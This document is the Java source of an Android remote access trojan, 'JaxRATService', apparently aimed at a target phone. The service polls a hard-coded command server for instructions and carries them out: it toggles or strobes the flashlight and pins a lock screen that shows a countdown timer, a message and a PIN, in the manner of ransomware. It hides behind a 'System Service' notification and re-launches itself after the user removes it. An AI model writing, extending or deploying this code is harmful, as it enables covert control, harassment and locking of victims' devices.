package com.ezax.agent;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.SystemClock;
import androidx.core.app.NotificationCompat;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class JaxRATService extends Service {
    private static final String SERVER_URL = "http://192.168.1.53:5000"; 
    private static final String DEVICE_ID = "hp_target_1"; 
    private static final String CHANNEL_ID = "JaxRAT_Channel";
    
    private Handler handler = new Handler(Looper.getMainLooper());
    private CameraManager cameraManager;
    private String cameraId;
    private boolean isStrobe = false;
    private Handler strobeHandler = new Handler();
    private boolean isTorchOn = false;

    @Override
    public void onCreate() {
        super.onCreate();
        cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        try {
            for (String id : cameraManager.getCameraIdList()) {
                CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(id);
                Boolean flashAvailable = characteristics.get(CameraCharacteristics.FLASH_INFO_AVAILABLE);
                Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
                if (flashAvailable != null && flashAvailable && facing != null && facing == CameraCharacteristics.LENS_FACING_BACK) {
                    cameraId = id;
                    break;
                }
            }
        } catch (CameraAccessException e) { }

        createNotificationChannel();
        startForeground(1, getNotification());
        startPolling();
    }

    private void startPolling() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                fetchCommand();
                handler.postDelayed(this, 3000);
            }
        }, 3000);
    }

    private void fetchCommand() {
        new Thread(() -> {
            try {
                URL url = new URL(SERVER_URL + "/api/get_command/" + DEVICE_ID);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = in.readLine()) != null) response.append(line);
                in.close();

                JSONObject json = new JSONObject(response.toString());
                String cmd = json.optString("command", "none");
                if (!cmd.equals("none")) {
                    executeCommand(cmd);
                }
            } catch (Exception e) { }
        }).start();
    }

    private void executeCommand(String cmd) {
        if (cmd.equals("flash_on")) {
            stopStrobe(); setTorch(true);
        } else if (cmd.equals("flash_off")) {
            stopStrobe(); setTorch(false);
        } else if (cmd.equals("flash_strobe")) {
            startStrobe();
        } else if (cmd.equals("STOP_ALL")) {
            stopStrobe(); setTorch(false);
        } else if (cmd.startsWith("pin|")) {
            String[] parts = cmd.split("\\|");
            if (parts.length >= 7) {
                Intent intent = new Intent(this, LockScreenActivity.class);
                intent.putExtra("TIMER", Long.parseLong(parts[1].trim()));
                intent.putExtra("SUARA", parts[2].trim()); // Terusin data suara
                intent.putExtra("PESAN", parts[5].trim());
                intent.putExtra("PIN", parts[6].trim());
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            }
        } else if (cmd.equals("unpin_screen")) {
            Intent intent = new Intent(this, LockScreenActivity.class);
            intent.putExtra("ACTION", "FINISH");
            intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP | Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            
            Intent broadcastIntent = new Intent("UNLOCK_SCREEN_ACTION");
            broadcastIntent.setPackage(getPackageName());
            sendBroadcast(broadcastIntent);
        }
    }

    private void setTorch(boolean state) {
        try {
            if (cameraId != null) cameraManager.setTorchMode(cameraId, state);
        } catch (CameraAccessException e) { }
    }

    private void startStrobe() {
        isStrobe = true;
        strobeHandler.post(strobeRunnable);
    }

    private void stopStrobe() {
        isStrobe = false;
        strobeHandler.removeCallbacks(strobeRunnable);
        setTorch(false);
    }

    private final Runnable strobeRunnable = new Runnable() {
        @Override
        public void run() {
            if (isStrobe) {
                setTorch(!isTorchOn);
                isTorchOn = !isTorchOn;
                strobeHandler.postDelayed(this, 400);
            }
        }
    };

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID, "JaxRAT Service", NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(serviceChannel);
        }
    }

    private Notification getNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Service")
                .setContentText("Menjalankan layanan sistem...")
                .setSmallIcon(android.R.drawable.ic_menu_compass)
                .setOngoing(true) 
                .build();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY; 
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Intent restartServiceIntent = new Intent(getApplicationContext(), this.getClass());
        restartServiceIntent.setPackage(getPackageName());
        PendingIntent restartServicePendingIntent = PendingIntent.getService(
                getApplicationContext(), 1, restartServiceIntent, PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
        AlarmManager alarmService = (AlarmManager) getApplicationContext().getSystemService(Context.ALARM_SERVICE);
        if (alarmService != null) {
            alarmService.set(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime() + 1000, restartServicePendingIntent);
        }
        super.onTaskRemoved(rootIntent);
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
